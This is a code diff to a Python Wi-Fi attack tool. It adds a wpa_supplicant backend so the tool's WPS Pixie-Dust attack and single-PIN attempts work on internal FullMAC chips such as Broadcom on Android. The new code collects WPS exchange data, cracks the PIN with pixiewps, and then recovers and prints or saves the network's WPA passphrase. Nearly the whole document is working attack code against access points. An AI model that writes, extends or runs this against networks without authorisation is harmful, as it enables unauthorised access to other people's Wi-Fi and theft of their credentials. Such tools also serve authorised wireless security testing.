@@ -566,10 +566,16 @@ class BruteforceStatus:
 class Companion:
     """Main application part — drives the built-in native WPS engine."""
 
-    def __init__(self, interface, save_result=False, print_debug=False):
+    def __init__(self, interface, save_result=False, print_debug=False,
+                 use_wpas=False, wpas_bin=None):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
+        # Backend: the native nl80211 engine (default, works on mac80211/softMAC
+        # and external adapters) or a driven wpa_supplicant (for internal FullMAC
+        # chips like Broadcom on Android, where a raw nl80211 CONNECT is refused).
+        self.use_wpas = use_wpas
+        self.wpas_bin = wpas_bin
 
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
@@ -578,6 +584,7 @@ class Companion:
         self.sessions_dir = data_root + '/sessions/'
         self.pixiewps_dir = data_root + '/pixiewps/'
         self.reports_dir = data_root + '/reports/'
+        self.wpas_run_dir = data_root + '/run/'
         for d in (self.sessions_dir, self.pixiewps_dir):
             os.makedirs(d, exist_ok=True)
 
@@ -675,8 +682,52 @@ class Companion:
             return None
         return pin
 
+    def _single_connection_wpas(self, bssid=None, ssid=None, pin=None, pixiemode=False, serial=None):
+        """Pixie-Dust (-K) or a single PIN attempt by driving wpa_supplicant."""
+        import wpa_backend
+        if pixiemode and not pin:
+            pin = '12345670'   # any PIN reaches M3; Pixie only needs M1-M3 data
+        if not pixiemode and not pin:
+            pin = self.__prompt_wpspin(bssid, ssid, serial) or '12345670'
+        try:
+            with wpa_backend.WpaSupplicant(self.interface, self.wpas_run_dir,
+                                           binary=self.wpas_bin, verbose=self.print_debug) as w:
+                self.pixie_creds.clear()
+                self.connection_status.clear()
+                w.wps_connection(bssid, pin, self.pixie_creds, self.connection_status,
+                                 pixiemode=pixiemode)
+                if pixiemode:
+                    if not self.pixie_creds.got_all():
+                        print('[!] Not enough data to run Pixie Dust attack')
+                        return False
+                    cracked = self.__runPixiewps()
+                    if not cracked:
+                        return False
+                    self.__savePin(bssid, cracked)
+                    pin = cracked
+                    # Recover the PSK with the cracked PIN over the same supplicant.
+                    self.connection_status.clear()
+                    w.wps_connection(bssid, pin, self.pixie_creds, self.connection_status)
+        except wpa_backend.WpaSupplicantError as e:
+            print('[!] {}'.format(e))
+            return False
+        if self.connection_status.status == 'GOT_PSK':
+            essid = self.connection_status.essid or ssid or ''
+            self.__credentialPrint(pin, self.connection_status.wpa_psk, essid)
+            if self.save_result:
+                self.__saveResult(bssid, essid, pin, self.connection_status.wpa_psk)
+            return True
+        print('[-] Could not recover the PSK (PIN may be wrong or AP rejected it)')
+        return False
+
     def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False, serial=None):
-        """Pixie-Dust (-K) or a single PIN attempt, entirely via the native engine."""
+        """Pixie-Dust (-K) or a single PIN attempt.
+
+        Uses the driven-wpa_supplicant backend when selected (internal FullMAC
+        chips), otherwise the built-in native nl80211 engine.
+        """
+        if self.use_wpas:
+            return self._single_connection_wpas(bssid, ssid, pin, pixiemode, serial)
         if pixiemode:
             self.__collect_pixie_native(bssid, ssid)
             if not self.pixie_creds.got_all():
@@ -782,6 +833,11 @@ class Companion:
 
     def smart_bruteforce(self, bssid, ssid=None, start_pin=None, delay=None, loop=False):
         """Online WPS PIN bruteforce via the native engine (half-by-half)."""
+        if self.use_wpas:
+            print('[!] Online bruteforce (-B) is not wired through the wpa_supplicant '
+                  'backend yet — only Pixie-Dust (-K) and a single PIN (-p) are. '
+                  'Drop --wpa-supplicant to use the native bruteforce, or use -K.')
+            return
         try:
             import wps_connect
         except ImportError:
@@ -1097,6 +1153,22 @@ if __name__ == '__main__':
              'Turn off Wi-Fi in the system settings before using this.'
         )
     parser.add_argument(
+        '--wpa-supplicant',
+        action='store_true',
+        help='Drive a real wpa_supplicant (WPS_REG) instead of the built-in nl80211 engine. '
+             'Use this for internal FullMAC chips (e.g. Broadcom on Android) where a raw '
+             'nl80211 association is refused. Disable system Wi-Fi first. Needs a '
+             'wpa_supplicant binary built with WPS support.'
+        )
+    parser.add_argument(
+        '--wpa-supplicant-path',
+        type=str,
+        default=None,
+        metavar='PATH',
+        help='Path to the wpa_supplicant binary (default: search PATH and the usual '
+             'Android locations)'
+        )
+    parser.add_argument(
         '-v', '--verbose',
         action='store_true',
         help='Verbose output'
@@ -1137,7 +1209,9 @@ if __name__ == '__main__':
                     args.bssid = network_info[0]
                     args.ssid = network_info[1] if len(network_info) > 1 else None
             if args.bssid:
-                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                companion = Companion(args.interface, args.write, print_debug=args.verbose,
+                                      use_wpas=args.wpa_supplicant,
+                                      wpas_bin=args.wpa_supplicant_path)
                 if args.bruteforce:
                     companion.smart_bruteforce(args.bssid, ssid=args.ssid, start_pin=args.pin,
                                                delay=args.delay, loop=args.loop)
